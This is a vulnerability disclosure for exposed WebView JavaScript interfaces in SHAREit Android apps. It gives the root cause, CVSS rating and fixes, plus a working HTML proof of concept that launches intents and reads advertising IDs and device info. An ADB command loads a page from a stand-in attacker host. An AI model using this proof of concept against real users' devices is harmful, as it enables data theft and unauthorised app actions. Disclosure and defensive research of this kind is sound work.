
# A Renegade Exploration of (In)Secure Navigation in Mobile Applications  

![Demo Screenshot 1](https://github.com/user-attachments/assets/cc14759e-6b9b-4b5c-a770-740ec431862b)
![Demo Screenshot 2](https://github.com/user-attachments/assets/57fc4486-564e-40ed-8f8e-4bc71c2f73bc)
![PoC demo GIF](https://github.com/actuator/com.lenovo.anyshare.gps/blob/main/shareitIntent.gif)

---

## 📌 Summary

**Affected Applications:**  
- SHAREit Lite (`shareit.lite`) – version 3.8.8_ww  
- SHAREit (full) (`com.lenovo.anyshare.gps`) – version 6.26.8_ww  

Both apps expose WebViews with **JavaScript Interfaces (JSI)** bound to untrusted content, giving **arbitrary system privileges to any webpage** loaded inside them.  

**Attack Surface:**  
- Remote: a user opens an attacker page inside SHAREit.  
- Local: a zero-permission app or ADB command forces SHAREit to load an attacker page via its Downloader.  

**Impact:**  
- **Sensitive data disclosure:** GAID, tokens, device info.  
- **Integrity violations:** Arbitrary app launches, activities, broadcasts, services.  
- **Installless IPC:** Web content acts with installed-app privileges.  

---

## 🧩 Affected Components  

### `WebClientActivity`  

```java
this.o.addJavascriptInterface(new WebClient(), "client");
````

### Key Exposed Methods

* `executeSystemEvent(int type, String intentUri)`
* `run(String packageName)`
* `getGAID()`
* `getDeviceInfo()`
* `getSzUserInfo()` / `getUserInfo()`

### Underlying Engine

`executeSystemEvent` → `yt2.b().b(...)` → `ms8.c(...)` which calls:

* `startActivity`
* `sendBroadcast`
* `startService`

---

## ⚙️ Root Cause

* No origin checks for the bound `JavascriptInterface`.
* Direct parsing of arbitrary `Intent` URIs.
* Ability to call OS-level IPC from untrusted web content.

---

## 💥 Impact

* **Start any exported activity** of any installed app.
* **Send arbitrary broadcasts**, possibly hitting sensitive receivers.
* **Start arbitrary services.**
* **Launch apps silently via run().**
* **Harvest GAID, user tokens, device info.**

---

## 🧪 Proof of Concept

### HTML PoC

```html
<html>
  <body>
    <h3>Generic PoC for SHAREit WebView Vulnerabilities</h3>
    <pre id="log"></pre>
    <script>
      function print(msg) {
        document.getElementById("log").textContent += msg + "\n";
      }

      // Generic harmless intent: opens Settings app
      var genericIntent = "intent:#Intent;action=android.intent.action.VIEW;" +
                          "component=com.android.settings/.Settings;end";

      // Start Activity
      try {
        client.executeSystemEvent(1, genericIntent);
        print("Started Activity via executeSystemEvent");
      } catch (e) { print(e); }

      // Send Broadcast
      try {
        client.executeSystemEvent(2, genericIntent);
        print("Broadcast sent via executeSystemEvent");
      } catch (e) { print(e); }

      // Start Service
      try {
        client.executeSystemEvent(3, genericIntent);
        print("Service started via executeSystemEvent");
      } catch (e) { print(e); }

      // Launch App via run()
      try {
        client.run("com.android.calculator2");
        print("Launched calculator via run()");
      } catch (e) { print(e); }

      // Data leaks
      try {
        print("GAID: " + client.getGAID());
        print("Device Info: " + client.getDeviceInfo());
      } catch (e) { print(e); }
    </script>
  </body>
</html>
```

---

### ADB Trigger

```bash
adb shell am start -n com.lenovo.anyshare.gps/com.lenovo.anyshare.Downloader \
  -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
  -d "https://attacker.example/poc.html"
```

---

## 🔬 Technical Classification

* **CWE-749** – Exposed Dangerous Method or Function.
* **CWE-926** – Improper Export of Android Application Components.
* **CWE-200 / CWE-359** – Information Exposure (GAID, app/user tokens).

---

## 🚨 Severity

* **CVSS v3.1:** AV\:N/AC\:L/PR\:N/UI\:R/S\:C/C\:H/I\:H/A\:N → **8.6 High**
* **Network exploitable.**
* **No privileges required.**
* **User only needs to visit attacker content inside SHAREit.**

---

## 🎯 Attacker Use Cases

* **Installless IPC:** Trigger flows that normally require an installed app or special permissions.
* **Privilege escalation:** Send broadcast intents to privileged receivers or start hidden activities.
* **Data exfiltration:** Extract advertising IDs, tokens, and device fingerprints.
* **Local stagers:** A zero-permission local app can leverage SHAREit’s WebView as a trampoline.

---

## 🛠 Recommendations

* Restrict or remove JSI binding to untrusted origins.
* Validate and whitelist any Intent URIs before execution.
* Require user interaction/consent before launching external apps or collecting device identifiers.
* Harden Downloader activity with caller checks or explicit permissions.
* Use Chrome Custom Tabs for external navigation.

---

## 📚 References

* [Android WebView security guidelines](https://developer.android.com/guide/webapps/webview)
* [Unsafe JavaScript interfaces](https://developer.android.com/training/articles/security-tips#WebView)

---

> ⚠️ **Disclaimer:** This information is for educational and defensive security research purposes only.
